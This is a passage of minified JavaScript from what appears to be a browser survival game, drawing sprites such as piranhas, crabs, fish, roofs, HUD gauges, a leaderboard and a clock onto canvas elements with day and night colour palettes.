                        E.bezierCurveTo(288.633544921875 * d, 297.9858093261719 * d, 288.633544921875 * d, 265.9858093261719 * d, 275.633544921875 * d, 266.9858093261719 * d),
                        E.bezierCurveTo(280.633544921875 * d, 294.9858093261719 * d, 315.633544921875 * d, 306.9858093261719 * d, 336.633544921875 * d, 316.9858093261719 * d),
                        E.bezierCurveTo(295.633544921875 * d, 318.9858093261719 * d, 264.633544921875 * d, 302.9858093261719 * d, 254.633544921875 * d, 289.9858093261719 * d),
                        E.bezierCurveTo(252.633544921875 * d, 301.9858093261719 * d, 224.633544921875 * d, 315.9858093261719 * d, 201.633544921875 * d, 356.9858093261719 * d),
                        E.bezierCurveTo(195.633544921875 * d, 313.9858093261719 * d, 195.633544921875 * d, 308.9858093261719 * d, 196.633544921875 * d, 307.9858093261719 * d),
                        E.bezierCurveTo(197.633544921875 * d, 289.9858093261719 * d, 207.633544921875 * d, 283.9858093261719 * d, 195.633544921875 * d, 258.9858093261719 * d),
                        E.bezierCurveTo(182.633544921875 * d, 282.9858093261719 * d, 190.633544921875 * d, 287.9858093261719 * d, 193.633544921875 * d, 297.9858093261719 * d),
                        E.bezierCurveTo(195.633544921875 * d, 306.9858093261719 * d, 191.633544921875 * d, 334.9858093261719 * d, 187.633544921875 * d, 354.9858093261719 * d),
                        E.bezierCurveTo(165.633544921875 * d, 320.9858093261719 * d, 138.633544921875 * d, 307.9858093261719 * d, 135.633544921875 * d, 288.9858093261719 * d),
                        E.bezierCurveTo(110.633544921875 * d, 318.9858093261719 * d, 68.633544921875 * d, 323.9858093261719 * d, 49.633544921875 * d, 320.9858093261719 * d),
                        E.bezierCurveTo(88.633544921875 * d, 308.9858093261719 * d, 108.633544921875 * d, 284.9858093261719 * d, 118.633544921875 * d, 258.9858093261719 * d),
                        E.bezierCurveTo(86.633544921875 * d, 264.9858093261719 * d, 75.633544921875 * d, 310.9858093261719 * d, 19.633544921875 * d, 304.9858093261719 * d),
                        E.bezierCurveTo(54.633544921875 * d, 276.9858093261719 * d, 59.633544921875 * d, 214.98580932617188 * d, 105.633544921875 * d, 205.98580932617188 * d),
                        E.bezierCurveTo(14.633544921875 * d, 201.98580932617188 * d, 24.633544921875 * d, 141.98580932617188 * d, 25.633544921875 * d, 82.98580932617188 * d),
                        E.bezierCurveTo(49.633544921875 * d, 168.98580932617188 * d, 87.633544921875 * d, 141.98580932617188 * d, 112.633544921875 * d, 123.98580932617188 * d),
                        E.bezierCurveTo(95.633544921875 * d, 75.98580932617188 * d, 70.633544921875 * d, 68.98580932617188 * d, 35.633544921875 * d, 50.985809326171875 * d),
                        E.bezierCurveTo(70.633544921875 * d, 53.985809326171875 * d, 102.633544921875 * d, 65.98580932617188 * d, 125.633544921875 * d, 84.98580932617188 * d),
                        E.bezierCurveTo(133.633544921875 * d, 69.98580932617188 * d, 166.633544921875 * d, 42.985809326171875 * d, 176.633544921875 * d, 21.985809326171875 * d),
                        E.bezierCurveTo(185.633544921875 * d, 49.985809326171875 * d, 168.633544921875 * d, 95.98580932617188 * d, 191.633544921875 * d, 121.98580932617188 * d),
                        E.closePath(),
                        he(E, a[0], a[0], 12 * d),
                        n)),
                    sprite[ze.PIRANHA] = [],
                    sprite[ze.PIRANHA][ze.DAY] = c(p0(.8, 0, ["#1e2021", "#961B1B", "#702727", "#C43B3B", "#d15151", "#B71C1C", "#E8E8E8", "#752E2E", "#891818"])),
                    sprite[ze.PIRANHA][ze.NIGHT] = c(p0(.8, 0, ["#0c0c0d", "#21112D", "#281A49", "#462966", "#321C56", "#1C073D", "#FFFFFF", "#1C0833", "#1B1238"])),
                    sprite[ze.HURT_PIRANHA] = c((s = .8,
                        T = ["#B6222A"],
                        o = document.createElement("canvas"),
                        r = o.getContext("2d"),
                        o.width = 158 * s,
                        o.height = 201 * s,
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(96.5 * s, 76.421875 * s),
                        r.bezierCurveTo(100.5 * s, 64.421875 * s, 103.5 * s, 62.421875 * s, 110.5 * s, 65.421875 * s),
                        r.bezierCurveTo(116.5 * s, 66.421875 * s, 117.5 * s, 67.421875 * s, 112.5 * s, 73.421875 * s),
                        r.bezierCurveTo(107 * s, 79.921875 * s, 107 * s, 79.921875 * s, 101.5 * s, 86.421875 * s),
                        r.closePath(),
                        he(r, T[0], T[0], 10 * s),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(61.5 * s, 78.421875 * s),
                        r.bezierCurveTo(57.5 * s, 73.421875 * s, 51.5 * s, 66.421875 * s, 45.5 * s, 68.421875 * s),
                        r.bezierCurveTo(32.5 * s, 73.421875 * s, 38.5 * s, 75.421875 * s, 46.5 * s, 81.421875 * s),
                        r.bezierCurveTo(51.5 * s, 84.921875 * s, 51.5 * s, 84.921875 * s, 56.5 * s, 88.421875 * s),
                        r.closePath(),
                        he(r, T[0], T[0], 10 * s),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(116.5 * s, 127.421875 * s),
                        r.bezierCurveTo(124.5 * s, 108.421875 * s, 129.5 * s, 104.421875 * s, 141.5 * s, 107.421875 * s),
                        r.bezierCurveTo(156.5 * s, 112.421875 * s, 153.5 * s, 113.421875 * s, 132.5 * s, 134.421875 * s),
                        r.bezierCurveTo(123.5 * s, 141.921875 * s, 123.5 * s, 141.921875 * s, 114.5 * s, 149.421875 * s),
                        r.closePath(),
                        he(r, T[0], T[0], 10 * s),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(41.5 * s, 134.421875 * s),
                        r.bezierCurveTo(30.5 * s, 119.421875 * s, 25.5 * s, 111.421875 * s, 12.5 * s, 115.421875 * s),
                        r.bezierCurveTo(4.5 * s, 120.421875 * s, 4.5 * s, 121.421875 * s, 26.5 * s, 142.421875 * s),
                        r.bezierCurveTo(35 * s, 149.921875 * s, 35 * s, 149.921875 * s, 43.5 * s, 157.421875 * s),
                        r.closePath(),
                        he(r, T[0], T[0], 10 * s),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(78.5 * s, 51.921875 * s),
                        r.bezierCurveTo(99.5 * s, 75.921875 * s, 110.5 * s, 96.921875 * s, 118.5 * s, 120.921875 * s),
                        r.bezierCurveTo(121.5 * s, 140.921875 * s, 107.5 * s, 179.921875 * s, 75.5 * s, 183.921875 * s),
                        r.bezierCurveTo(30.5 * s, 169.921875 * s, 37.5 * s, 131.921875 * s, 34.5 * s, 120.921875 * s),
                        r.bezierCurveTo(41.5 * s, 89.921875 * s, 61.5 * s, 67.921875 * s, 78.5 * s, 51.921875 * s),
                        r.closePath(),
                        he(r, T[0], T[0], 10 * s),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(72.5 * s, 72.421875 * s),
                        r.bezierCurveTo(76.5 * s, 79.421875 * s, 79.5 * s, 80.421875 * s, 83.5 * s, 73.421875 * s),
                        r.bezierCurveTo(80.5 * s, 96.921875 * s, 79.5 * s, 114.421875 * s, 77.5 * s, 120.421875 * s),
                        r.closePath(),
                        he(r, T[0], T[0], 10 * s),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(42.5 * s, 163.421875 * s),
                        r.bezierCurveTo(62.5 * s, 185.421875 * s, 86.5 * s, 186.421875 * s, 111.5 * s, 165.421875 * s),
                        r.bezierCurveTo(107.5 * s, 176.421875 * s, 95.5 * s, 187.421875 * s, 75.5 * s, 188.421875 * s),
                        r.bezierCurveTo(53.5 * s, 188.421875 * s, 43.5 * s, 171.421875 * s, 42.5 * s, 164.421875 * s),
                        r.closePath(),
                        he(r, T[0], T[0], 10 * s),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(79.5 * s, 61.421875 * s),
                        r.bezierCurveTo(88.5 * s, 31.421875 * s, 81.5 * s, 16.421875 * s, 75.5 * s, 7.421875 * s),
                        r.bezierCurveTo(77.5 * s, 28.421875 * s, 77.5 * s, 37.421875 * s, 68.5 * s, 42.421875 * s),
                        r.bezierCurveTo(79.5 * s, 57.421875 * s, 79.5 * s, 58.421875 * s, 80.5 * s, 61.421875 * s),
                        r.closePath(),
                        he(r, T[0], T[0], 10 * s),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(72.5 * s, 72.421875 * s),
                        r.bezierCurveTo(76.5 * s, 79.421875 * s, 79.5 * s, 80.421875 * s, 83.5 * s, 73.421875 * s),
                        r.bezierCurveTo(80.5 * s, 96.921875 * s, 79.5 * s, 114.421875 * s, 77.5 * s, 120.421875 * s),
                        r.closePath(),
                        he(r, T[0], T[0], 10 * s),
                        o)),
                    sprite[ze.FISH1] = [],
                    sprite[ze.FISH1][ze.DAY] = c(A1(.4, 0, ["#1e2021", "#db6f26", "#ffffff", "#000000", "#833813"], 0)),
                    sprite[ze.FISH1][ze.NIGHT] = c(A1(.4, 0, ["#0c0c0d", "#21112D", "#281A49", "#462966"], 0)),
                    sprite[ze.FISH2] = [],
                    sprite[ze.FISH2][ze.DAY] = c(A1(.4, 0, ["#1e2021", "#d35e35", "#ffffff", "#000000", "#000000"], 1)),
                    sprite[ze.FISH2][ze.NIGHT] = c(A1(.4, 0, ["#0c0c0d", "#21112D", "#281A49", "#462966"], 1)),
                    sprite[ze.FISH3] = [],
                    sprite[ze.FISH3][ze.DAY] = c(A1(.4, 0, ["#1e2021", "#2973a5", "#ffffff", "#ffff00", "#000000", "#03243f", "#f2ec30", "#162f6d"], 0)),
                    sprite[ze.FISH3][ze.NIGHT] = c(A1(.4, 0, ["#0c0c0d", "#21112D", "#281A49", "#462966"], 0)),
                    sprite[ze.HURT_FISH1] = c(h1(.4, ["#B6222A"])),
                    sprite[ze.HURT_FISH2] = c(h1(.4, ["#B6222A"])),
                    sprite[ze.HURT_FISH3] = c(h1(.4, ["#B6222A"])),
                    sprite[ze.CRAB_LOOT] = c(kt(.35, !0, ["#0d1b1c", "#c04933", "#a33e2b", "#ee593d", "#c04933"])),
                    sprite[ze.CRAB_STICK] = c(nt(.35, !0, ["#1e2021", "#ed5f4f", "#ce4545", "#ffffff", "#e2dad7"])),
                    sprite[ze.CRAB_ATTACK] = [],
                    sprite[ze.CRAB_ATTACK][ze.DAY] = c($1(.35, 0, ["#1e2021", "#e45936", "#B6222A", "#B6222A", "#FFFFFF"], 1)),
                    sprite[ze.CRAB_ATTACK][ze.NIGHT] = c($1(.35, 0, ["#0c0c0d", "#613577", "#462966", "#1C073D", "#FFFFFF"], 1)),
                    sprite[ze.CRAB] = [],
                    sprite[ze.CRAB][ze.DAY] = c($1(.35, 0, ["#1e2021", "#e45936", "#ffffff", "#181414", "#FFFFFF"], 0)),
                    sprite[ze.CRAB][ze.NIGHT] = c($1(.35, 0, ["#0c0c0d", "#34255d", "#563f83", "#180f21", "#FFFFFF"], 0)),
                    sprite[ze.CRAB_CLAW_LEFT] = [],
                    sprite[ze.CRAB_CLAW_LEFT][ze.DAY] = c(tt(.35, 0, ["#1e2021", "#e45936", "#ffffff"])),
                    sprite[ze.CRAB_CLAW_LEFT][ze.NIGHT] = c(tt(.35, 0, ["#0c0c0d", "#34255d", "#563f83"])),
                    sprite[ze.CRAB_CLAW_RIGHT] = [],
                    sprite[ze.CRAB_CLAW_RIGHT][ze.DAY] = c(it(.42, 0, ["#1e2021", "#e45936", "#ffffff"])),
                    sprite[ze.CRAB_CLAW_RIGHT][ze.NIGHT] = c(it(.42, 0, ["#0c0c0d", "#34255d", "#563f83"])),
                    sprite[ze.CRAB_CLAW_LEFT_ATTACK] = [],
                    sprite[ze.CRAB_CLAW_LEFT_ATTACK][ze.DAY] = c(tt(.35, 0, ["#1e2021", "#e45936", "#B6222A"])),
                    sprite[ze.CRAB_CLAW_LEFT_ATTACK][ze.NIGHT] = c(tt(.35, 0, ["#0c0c0d", "#613577", "#462966"])),
                    sprite[ze.CRAB_CLAW_RIGHT_ATTACK] = [],
                    sprite[ze.CRAB_CLAW_RIGHT_ATTACK][ze.DAY] = c(it(.42, 0, ["#1e2021", "#e45936", "#B6222A"])),
                    sprite[ze.CRAB_CLAW_RIGHT_ATTACK][ze.NIGHT] = c(it(.42, 0, ["#0c0c0d", "#613577", "#462966"])),
                    sprite[ze.HURT_CRAB] = c(et(.35, ["#B6222A"])),
                    sprite[ze.HURT_CRAB_CLAW_LEFT] = c(tt(.35, 0, [void 0, "#B6222A"])),
                    sprite[ze.HURT_CRAB_CLAW_RIGHT] = c(it(.35, 0, [void 0, "#B6222A"])),
                    sprite[ze.HEAL_CRAB] = c(et(.35, ["#22E066"])),
                    sprite[ze.HEAL_CRAB_CLAW_LEFT] = c(tt(.35, 0, [void 0, "#22E066"])),
                    sprite[ze.HEAL_CRAB_CLAW_RIGHT] = c(it(.35, 0, [void 0, "#22E066"])),
                    sprite[ze.DIVING_MASK] = [],
                    sprite[ze.DIVING_MASK][ze.DAY] = c(Ct(.3, !0, ["#1e2021", "#65A8B7", "#2E85A0", "#14275B", "#081826", "#1A3163", "#0C1944", "#89C4CE", "#2E85A0"])),
                    sprite[ze.DIVING_MASK][ze.NIGHT] = c(Ct(.3, !0, ["#0c0c0d", "#89C9C7", "#469E95", "#092C38", "#072021", "#0E343D", "#071F2D", "#9FD3D3", "#135367"])),
                    sprite[ze.SUPER_DIVING_SUIT] = [],
                    sprite[ze.SUPER_DIVING_SUIT][ze.DAY] = c(bt(.45, !0, ["#C4BC51", "#B29C32", "#201851", "#652D8E", "#1e2021", "#2E85A0"])),
                    sprite[ze.SUPER_DIVING_SUIT][ze.NIGHT] = c(bt(.45, !0, ["#235050", "#357472", "#081B2D", "#342C7C", "#0c0c0d", "#135367"])),
                    sprite[ze.PLOT] = [],
                    sprite[ze.PLOT][ze.DAY] = c(u0(.63, !0, ["#1e2021", "#352E1E", "#4C3B19", "#574122"])),
                    sprite[ze.PLOT][ze.NIGHT] = c(u0(.63, !0, ["#0c0c0d", "#071f22", "#0d2e33", "#184747"])),
                    sprite[ze.BRIDGE] = [],
                    sprite[ze.BRIDGE][ze.DAY] = c(a0(1, !0, ["#1e2021", "#332715", "#4C3B19", "#574122"])),
                    sprite[ze.BRIDGE][ze.NIGHT] = c(a0(1, !0, ["#0c0c0d", "#071f22", "#0d2e33", "#184747"])),
                    sprite[ze.WOOD_TOWER] = [],
                    sprite[ze.WOOD_TOWER][ze.DAY] = IMAGES.WOOD_TOWERD,
                    sprite[ze.WOOD_TOWER][ze.NIGHT] = IMAGES.WOOD_TOWERN,
                    sprite[ze.ROOF] = [],
                    sprite[ze.ROOF][ze.DAY] = c(a1(.59, 0, ["#0d1b1c", "#44301b", "#57442a", "#523e26"])),
                    sprite[ze.ROOF][ze.NIGHT] = c(a1(.59, 0, ["#0c0c0d", "#062124", "#10373d", "#0f3333"])),
                    sprite[ze.ROOFS] = [sprite[ze.ROOF]],
                    sprite[ze.ROOFS][1] = [],
                    sprite[ze.ROOFS][2] = [],
                    sprite[ze.ROOFS][1][ze.DAY] = c(s1(.59, 0, ["#0d1b1c", "#44301b", "#57442a", "#523e26"])),
                    sprite[ze.ROOFS][1][ze.NIGHT] = c(s1(.59, 0, ["#0c0c0d", "#062124", "#10373d", "#0f3333"])),
                    sprite[ze.ROOFS][2][ze.DAY] = c(_1(.59, 0, ["#0d1b1c", "#44301b", "#57442a", "#523e26"])),
                    sprite[ze.ROOFS][2][ze.NIGHT] = c(_1(.59, 0, ["#0c0c0d", "#062124", "#10373d", "#0f3333"])),
                    sprite[ze.WATERING_CAN_FULL] = [],
                    sprite[ze.WATERING_CAN_FULL][ze.DAY] = c(I(3 - Math.PI / 2, d0(.6, !0, ["#1e2021", "#674C2A", "#4C3B19", "#594225", "#1678a2"]))),
                    sprite[ze.WATERING_CAN_FULL][ze.NIGHT] = c(I(3 - Math.PI / 2, d0(.6, !0, ["#0c0c0d", "#07383c", "#0c4e53", "#042b2e", "#0c5975", "#11546c"]))),
                    sprite[ze.DEAD_BOX] = [],
                    sprite[ze.DEAD_BOX][ze.DAY] = c(b1(.3, ["#ad8850", "#714f24", "#9f7d4a", "#b38e59", "#8b1008"], 0)),
                    sprite[ze.DEAD_BOX][ze.NIGHT] = c(b1(.3, ["#1F5453", "#123335", "#1D4947", "#1F5453", "#0c2629"], 0)),
                    sprite[ze.DEAD_BOX_UI] = c((E = .3,
                        a = ["#ad8850", "#714f24", "#9f7d4a", "#b38e59", "#413624"],
                        d = document.createElement("canvas"),
                        n = d.getContext("2d"),
                        d.width = 650 * E,
                        d.height = 650 * E,
                        n.scale(1.9, 1.9),
                        n.save(),
                        n.translate(202.5 * E, 147.5 * E),
                        Ve(n, -96.5 * E, -21.5 * E, 193 * E, 193 * E, 0 * E),
                        n.restore(),
                        he(n, a[4], a[1], 12 * E),
                        n.save(),
                        n.translate(203.5 * E, 121.5 * E),
                        Ve(n, -115.5 * E, -20.5 * E, 231 * E, 41 * E, 10 * E),
                        n.restore(),
                        he(n, a[3], a[1], 12 * E),
                        n.save(),
                        n.translate(203.5 * E, 299 * E),
                        Ve(n, -115.5 * E, -20 * E, 231 * E, 40 * E, 10 * E),
                        n.restore(),
                        he(n, a[3], a[1], 12 * E),
                        n.save(),
                        n.translate(298.5 * E, 210 * E),
                        Ve(n, -20.5 * E, -109 * E, 41 * E, 218 * E, 10 * E),
                        n.restore(),
                        he(n, a[3], a[1], 12 * E),
                        n.save(),
                        n.translate(108.5 * E, 210 * E),
                        Ve(n, -20.5 * E, -109 * E, 41 * E, 218 * E, 10 * E),
                        n.restore(),
                        he(n, a[3], a[1], 12 * E),
                        n.save(),
                        n.translate(204 * E, 121.5 * E),
                        Ve(n, -92 * E, -9.5 * E, 184 * E, 19 * E, 10 * E),
                        n.restore(),
                        he(n, a[3], a[3], 10 * E),
                        n.save(),
                        n.translate(197 * E, 299 * E),
                        Ve(n, 85 * E, -9 * E, -170 * E, 18 * E, 10 * E),
                        n.restore(),
                        he(n, a[3], a[3], 10 * E),
                        n.beginPath(),
                        n.lineCap = "round",
                        n.lineJoin = "round",
                        n.moveTo(94 * E, 317 * E),
                        n.bezierCurveTo(110.5 * E, 299.5 * E, 110.5 * E, 299.5 * E, 127 * E, 282 * E),
                        n.closePath(),
                        he(n, void 0, a[1], 12 * E),
                        n.beginPath(),
                        n.lineCap = "round",
                        n.lineJoin = "round",
                        n.moveTo(279 * E, 142 * E),
                        n.bezierCurveTo(296.5 * E, 125.5 * E, 296.5 * E, 125.5 * E, 314 * E, 109 * E),
                        n.closePath(),
                        he(n, void 0, a[1], 12 * E),
                        n.beginPath(),
                        n.lineCap = "round",
                        n.lineJoin = "round",
                        n.moveTo(93 * E, 106 * E),
                        n.bezierCurveTo(110.5 * E, 124 * E, 110.5 * E, 124 * E, 128 * E, 142 * E),
                        n.closePath(),
                        he(n, void 0, a[1], 12 * E),
                        n.beginPath(),
                        n.lineCap = "round",
                        n.lineJoin = "round",
                        n.moveTo(281 * E, 282 * E),
                        n.bezierCurveTo(296 * E, 297.5 * E, 296 * E, 297.5 * E, 311 * E, 313 * E),
                        n.closePath(),
                        he(n, void 0, a[1], 12 * E),
                        d)),
                    sprite[ze.HURT_DEAD_BOX] = c((r = .3,
                        T = ["#BB0000"],
                        s = document.createElement("canvas"),
                        o = s.getContext("2d"),
                        s.width = 400 * r,
                        s.height = 400 * r,
                        o.save(),
                        o.translate(202.5 * r, 147.5 * r),
                        Ve(o, -96.5 * r, -21.5 * r, 193 * r, 43 * r, 0 * r),
                        o.restore(),
                        he(o, T[0], T[0], 12 * r),
                        o.save(),
                        o.translate(202.5 * r, 190.5 * r),
                        Ve(o, 96.5 * r, -21.5 * r, -193 * r, 43 * r, 0 * r),
                        o.restore(),
                        he(o, T[0], T[0], 12 * r),
                        o.save(),
                        o.translate(202.5 * r, 233.5 * r),
                        Ve(o, -96.5 * r, -20.5 * r, 193 * r, 41 * r, 0 * r),
                        o.restore(),
                        he(o, T[0], T[0], 12 * r),
                        o.save(),
                        o.translate(202.5 * r, 275 * r),
                        Ve(o, 96.5 * r, -21 * r, -193 * r, 42 * r, 0 * r),
                        o.restore(),
                        he(o, T[0], T[0], 12 * r),
                        o.save(),
                        o.translate(203.5 * r, 121.5 * r),
                        Ve(o, -115.5 * r, -20.5 * r, 231 * r, 41 * r, 10 * r),
                        o.restore(),
                        he(o, T[0], T[0], 12 * r),
                        o.save(),
                        o.translate(203.5 * r, 299 * r),
                        Ve(o, -115.5 * r, -20 * r, 231 * r, 40 * r, 10 * r),
                        o.restore(),
                        he(o, T[0], T[0], 12 * r),
                        o.save(),
                        o.translate(298.5 * r, 210 * r),
                        Ve(o, -20.5 * r, -109 * r, 41 * r, 218 * r, 10 * r),
                        o.restore(),
                        he(o, T[0], T[0], 12 * r),
                        o.save(),
                        o.translate(108.5 * r, 210 * r),
                        Ve(o, -20.5 * r, -109 * r, 41 * r, 218 * r, 10 * r),
                        o.restore(),
                        he(o, T[0], T[0], 12 * r),
                        s)),
                    sprite[ze.WINDMILL_FLOUR] = O(1, [{
                        f: R0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#B3AA8E", "#817961", "#EBEAE2", "#E0DFD8"]
                    }], .25, ["#d2c77b", "#e7dc8f", "#bfb360"], .7),
                    sprite[ze.LAVA_HEART] = O(1.5, [{
                        f: Xi,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#120202", "#750a0a", "#991616", "#120202"]
                    }], .45, ["#5bbcc9", "#73d2df", "#4daab6"], .9),
                    sprite[ze.HEART_SYMBOL_HUD] = y0(.35, ["#072428", "#67A242", "#67A242"], 0),
                    sprite[ze.COLD_SYMBOL_HUD] = y0(.35, ["#172130", "#649BB2", "#FFFFFF", "#FFFFFF", "#90C2D3", "#649BB2", "#84BDD1", "#2F5866"], 1),
                    sprite[ze.FOOD_SYMBOL_HUD] = y0(.35, ["#3F0B11", "#B13424", "#FFFFFF", "#B13424", "#7e180b"], 2),
                    sprite[ze.WATER_SYMBOL_HUD] = y0(.35, ["#1B2F4C", "#29488E", "#76c3e8", "#ffffff"], 3),
                    sprite[ze.LEADERBOARD] = c((n = 1,
                        a = document.createElement("canvas"),
                        E = a.getContext("2d"),
                        d = 200 * n,
                        o = 270 * n,
                        T = 8 * n,
                        a.width = d,
                        a.height = 20 + o,
                        E.beginPath(),
                        Ve(E, 0, 0, d, o - T, T),
                        E.globalAlpha = .5,
                        he(E, "#1D6055"),
                        E.globalAlpha = 1,
                        o = Tt(n, "Leaderboard", 25, "#FFF"),
                        E.drawImage(o, (d - o.width) / 2, 5 * n),
                        a)),
                    sprite[ze.GAUGES] = c((r = 1,
                        s = document.createElement("canvas"),
                        T = s.getContext("2d"),
                        E = 180 * r,
                        d = 50 * r,
                        o = 20 * r,
                        n = 240 * r,
                        a = 35 * r,
                        _ = +r,
                        u = i = 4 * r,
                        s.width = 950 * r,
                        s.height = d,
                        T.translate(0, 15 * r),
                        Ve(T, a, _, E, o, i),
                        he(T, null, "#69A148", u),
                        d = sprite[ze.HEART_SYMBOL_HUD],
                        T.drawImage(d, 17, -8),
                        T.translate(n, 0),
                        Ve(T, a, _, E, o, i),
                        he(T, null, "#AF352A", u),
                        d = sprite[ze.FOOD_SYMBOL_HUD],
                        T.drawImage(d, 17, -9),
                        T.translate(n, 0),
                        Ve(T, a, _, E, o, i),
                        he(T, null, "#669BB1", u),
                        d = sprite[ze.COLD_SYMBOL_HUD],
                        T.drawImage(d, 17, -8),
                        T.translate(n, 0),
                        Ve(T, a, _, E, o, i),
                        he(T, null, "#074A87", u),
                        d = sprite[ze.WATER_SYMBOL_HUD],
                        T.drawImage(d, 17, -8),
                        s)),
                    sprite[ze.OXYGEN] = c((r = 1,
                        n = document.createElement("canvas"),
                        a = n.getContext("2d"),
                        _ = 600 * r,
                        E = 22 * r,
                        i = o = 4 * r,
                        Ve(a, 5 * r, 5 * r, (n.width = _) - 10 * r, (n.height = E) - 10 * r, o),
                        he(a, null, "#BBE8EF", i),
                        n)),
                    sprite[ze.DELAY_HELMET] = c(Gi(.16, !0, ["rgba(0, 0, 0, 0)", "#FFFFFF", "#FFFFFF", "#FFFFFF", "#FFFFFF"])),
                    sprite[ze.DELAY_WEAPON] = c(I(5.8, Z1(.15, !0, ["rgba(0, 0, 0, 0)", "#FFFFFF", "#FFFFFF", "#FFFFFF", "#FFFFFF"]))),
                    sprite[ze.COUNTER] = [],
                    sprite[ze.SLOT_NUMBER] = [],
                    t = 0; t < Ue.WITH_BAG + 2; t++)
                    sprite[ze.SLOT_NUMBER][t] = Tt(1, "" + (t + 1), 12, "#FFF");
                sprite[ze.RECIPE_BUTTON] = [],
                    sprite[ze.RECIPE_BUTTON].push(c(H0(.12, ["#442F19", "#2C2112", "#C09D6F", "#A37943", "#eda80d"]))),
                    sprite[ze.RECIPE_BUTTON].push(c(H0(.12, ["#553b20", "#3e2f1a", "#d1ad7d", "#b3864c", "#eda80d"], 1))),
                    sprite[ze.RECIPE_BUTTON].push(c(H0(.12, ["#30200f", "#20180c", "#a78559", "#855f2f", "#b37d08"], 1))),
                    sprite[ze.CLOCK] = [],
                    sprite[ze.CLOCK].push(c((u = .22,
                        T = document.createElement("canvas"),
                        d = T.getContext("2d"),
                        T.width = 321 * u,
                        T.height = 345 * u,
                        d.translate(0, 5 * u),
                        d.translate(0, 20 * u),
                        ke(d, 160.5 * u, 159.5 * u, 156.39595138242822 * u),
                        he(d, "#322413", "#322413", 4 * u),
                        d.translate(0, -20 * u),
                        ke(d, 160.5 * u, 159.5 * u, 156.39595138242822 * u),
                        he(d, "#392C16", "#5E3E1A", 10 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(31.999969482421875 * u, 163.07290649414062 * u),
                        d.bezierCurveTo(22.999969482421875 * u, 67.07290649414062 * u, 106 * u, 20.072906494140625 * u, 162 * u, 23.072906494140625 * u),
                        d.bezierCurveTo(269.9999694824219 * u, 31.072906494140625 * u, 292.9999694824219 * u, 120.07290649414062 * u, 294.9999694824219 * u, 161.07290649414062 * u),
                        d.bezierCurveTo(165.49996948242188 * u, 162.07290649414062 * u, 165.49996948242188 * u, 162.07290649414062 * u, 35.999969482421875 * u, 163.07290649414062 * u),
                        d.closePath(),
                        he(d, "#12432D"),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(32.999969482421875 * u, 165.07290649414062 * u),
                        d.bezierCurveTo(16.999969482421875 * u, 221.07290649414062 * u, 85 * u, 289.0729064941406 * u, 156 * u, 294.0729064941406 * u),
                        d.bezierCurveTo(263.9999694824219 * u, 293.0729064941406 * u, 295.9999694824219 * u, 199.07290649414062 * u, 294.9999694824219 * u, 159.07290649414062 * u),
                        d.closePath(),
                        he(d, "#3A2A0D"),
                        ke(d, 161 * u, 158.07290649414062 * u, 133.4053971921676 * u),
                        he(d, void 0, "#5E3E1A", 10 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(31.999969482421875 * u, 161.62844848632812 * u),
                        d.bezierCurveTo(162.49996948242188 * u, 161.62844848632812 * u, 162.49996948242188 * u, 161.62844848632812 * u, 292.9999694824219 * u, 161.62844848632812 * u),
                        d.closePath(),
                        he(d, void 0, "#5E3E1A", 12 * u),
                        d.translate(0, 8 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(66 * u, 158.29513549804688 * u),
                        d.bezierCurveTo(86 * u, 158.29513549804688 * u, 86 * u, 158.29513549804688 * u, 106 * u, 158.29513549804688 * u),
                        d.closePath(),
                        he(d, void 0, "#c7a726", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(57.999969482421875 * u, 117.29513549804688 * u),
                        d.bezierCurveTo(85 * u, 128.29513549804688 * u, 85 * u, 128.29513549804688 * u, 113 * u, 139.29513549804688 * u),
                        d.closePath(),
                        he(d, void 0, "#c7a726", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(95 * u, 90.29513549804688 * u),
                        d.bezierCurveTo(112 * u, 105.79513549804688 * u, 112 * u, 105.79513549804688 * u, 129 * u, 121.29513549804688 * u),
                        d.closePath(),
                        he(d, void 0, "#c7a726", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(116 * u, 52.850677490234375 * u),
                        d.bezierCurveTo(130 * u, 83.85067749023438 * u, 130 * u, 83.85067749023438 * u, 144 * u, 114.85067749023438 * u),
                        d.closePath(),
                        he(d, void 0, "#c7a726", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(159 * u, 61.295135498046875 * u),
                        d.bezierCurveTo(160.49996948242188 * u, 92.29513549804688 * u, 160.49996948242188 * u, 92.29513549804688 * u, 160 * u, 123.29513549804688 * u),
                        d.closePath(),
                        he(d, void 0, "#c7a726", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(203 * u, 51.295135498046875 * u),
                        d.bezierCurveTo(190.49996948242188 * u, 83.29513549804688 * u, 190.49996948242188 * u, 83.29513549804688 * u, 176 * u, 115.29513549804688 * u),
                        d.closePath(),
                        he(d, void 0, "#c7a726", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(225 * u, 89.29513549804688 * u),
